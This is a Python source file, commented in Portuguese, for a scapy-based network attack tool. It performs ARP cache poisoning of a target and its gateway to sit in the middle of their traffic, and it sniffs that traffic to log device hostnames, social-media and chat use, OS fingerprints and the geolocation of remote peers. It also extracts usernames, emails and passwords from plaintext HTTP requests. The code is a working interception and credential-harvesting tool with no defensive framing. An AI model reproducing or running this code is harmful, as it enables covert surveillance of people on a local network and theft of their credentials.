import scapy.all as scapy
from scapy.layers import http
import re
import threading
import time
import os

import requests

# ==============================================================
# DSI SNIFFER - GRÃO-MESTRE SUPREMO (DPI & GEOLOCALIZAÇÃO)
# ==============================================================

class DSISniffer:
    def __init__(self, interface, log_callback=None):
        self.interface = interface
        self.log_callback = log_callback
        self.is_running = False
        self.sniff_thread = None
        self.geo_cache = {}
        
        # Filtros de interesse
        self.social_domains = [
            "facebook.com", "instagram.com", "twitter.com", "x.com", 
            "linkedin.com", "tiktok.com", "snapchat.com", "whatsapp.com",
            "messenger.com", "telegram.org", "cdninstagram.com", "fbcdn.net"
        ]
        
        self.cred_keywords = ["user", "username", "login", "email", "pass", "password"]

    def get_location(self, ip):
        if ip in self.geo_cache: return self.geo_cache[ip]
        try:
            # Consulta API Expert de Geolocalização
            r = requests.get(f"http://ip-api.com/json/{ip}", timeout=2)
            data = r.json()
            if data['status'] == 'success':
                loc = f"{data['city']} ({data['country']})"
                self.geo_cache[ip] = loc
                return loc
        except: pass
        return "Nuvem/CDN"

    def process_packet(self, packet):
        # 0. Identificação de Hostname (DHCP)
        if packet.haslayer(scapy.DHCP):
            src_mac = packet[scapy.Ether].src
            options = packet[scapy.DHCP].options
            for opt in options:
                if isinstance(opt, tuple) and opt[0] == 'hostname':
                    hostname = opt[1].decode(errors='ignore')
                    self.log(f"[DISPOSITIVO] Identificado Hostname: {hostname} (MAC: {src_mac})", log_type="info")
                    break

        # 1. Identificação de Redes Sociais e Chat
        if packet.haslayer(scapy.DNSQR):
            qname = packet[scapy.DNSQR].qname.decode('utf-8').lower()
            for domain in self.social_domains:
                if domain in qname:
                    src_ip = packet[scapy.IP].src
                    self.log(f"[SOCIAL] Alvo {src_ip} via {domain}", log_type="info")
                    break

        # 2. Intercepção de Tráfego P2P/Chat (Identificação de Origem Remota)
        if packet.haslayer(scapy.UDP) and packet.haslayer(scapy.IP):
            src_ip = packet[scapy.IP].src
            dst_ip = packet[scapy.IP].dst
            if packet[scapy.UDP].sport > 10000 or packet[scapy.UDP].dport > 10000:
                if not dst_ip.startswith("192.168.") and not dst_ip.startswith("10."):
                    location = self.get_location(dst_ip)
                    if location != "Nuvem/CDN":
                        self.log(f"[GEOLOCALIZAÇÃO] Mensagem de {src_ip} vinda de: {location}", log_type="error")

        # 3. Credenciais e Fingerprinting HTTP
        if packet.haslayer(http.HTTPRequest):
            src_ip = packet[scapy.IP].src
            # Fingerprinting via User-Agent
            ua = packet[http.HTTPRequest].User_Agent
            if ua:
                ua_str = ua.decode(errors='ignore')
                os_info = "iPhone/iOS" if "iPhone" in ua_str else "Android" if "Android" in ua_str else "Windows" if "Windows" in ua_str else "Mac" if "Macintosh" in ua_str else "Linux"
                self.log(f"[FINGERPRINT] Alvo {src_ip} está usando {os_info}", log_type="info")

            if packet.haslayer(scapy.Raw):
                load = packet[scapy.Raw].load.decode(errors='ignore').lower()
                for key in self.cred_keywords:
                    if key in load:
                        # Extrai o valor provável (sensível)
                        match = re.search(f"{key}=([^& ]+)", load)
                        value = match.group(1) if match else "Oculto"
                        self.log(f"!!! [DADO SENSÍVEL CAPTURADO] Alvo: {src_ip} | {key.upper()}: {value}", log_type="error")
                        break

    def start(self):
        if not self.is_running:
            self.is_running = True
            self.log(f"Iniciando Sniffer Magistrado na interface {self.interface}...", log_type="cmd")
            self.sniff_thread = threading.Thread(target=self._run_sniff, daemon=True)
            self.sniff_thread.start()

    def _run_sniff(self):
        try:
            # Sniffing infinito filtrando por IP
            scapy.sniff(iface=self.interface, store=False, prn=self.process_packet, stop_filter=self._stop_check)
        except Exception as e:
            self.log(f"Erro no motor de sniffing: {e}", log_type="error")
            self.is_running = False

    def _stop_check(self, packet):
        return not self.is_running

    def stop(self):
        self.is_running = False
        self.log("Sniffer Grão-Mestre desativado.", log_type="info")

# --- Ferramenta Auxiliar: ARP Scanner & Spoofing ---
def scan_network(interface):
    """ Escaneia a rede local em busca de dispositivos ativos """
    # Tenta descobrir o range da rede (ex: 192.168.1.0/24)
    # Para simplificar no expert mode, vamos pedir o IP do gateway ou assumir /24
    # Aqui usaremos um scan ARP rápido
    print(f"[*] Iniciando Varredura ARP na interface {interface}...")
    try:
        # Pega o IP local para deduzir o range
        import netifaces
        addrs = netifaces.ifaddresses(interface)
        ip_info = addrs[netifaces.AF_INET][0]
        ip = ip_info['addr']
        mask = ip_info['netmask']
        # Simplificação: assume /24
        network = ".".join(ip.split(".")[:-1]) + ".0/24"
        
        ans, unans = scapy.srp(scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst=network), timeout=2, iface=interface, verbose=False)
        devices = []
        for sent, received in ans:
            devices.append({'ip': received.psrc, 'mac': received.hwsrc})
        return devices
    except Exception as e:
        print(f"[!] Erro no scanner: {e}")
        return []

def get_mac(ip, interface):
    try:
        ans, _ = scapy.srp(scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst=ip), timeout=2, iface=interface, verbose=False)
        if ans: return ans[0][1].hwsrc
    except: pass
    return None

def spoof(target_ip, gateway_ip, interface):
    target_mac = get_mac(target_ip, interface)
    gateway_mac = get_mac(gateway_ip, interface)
    if target_mac and gateway_mac:
        # Envenena Alvo
        p1 = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
        # Envenena Gateway
        p2 = scapy.ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)
        scapy.send(p1, verbose=False, iface=interface)
        scapy.send(p2, verbose=False, iface=interface)
        return True
    return False
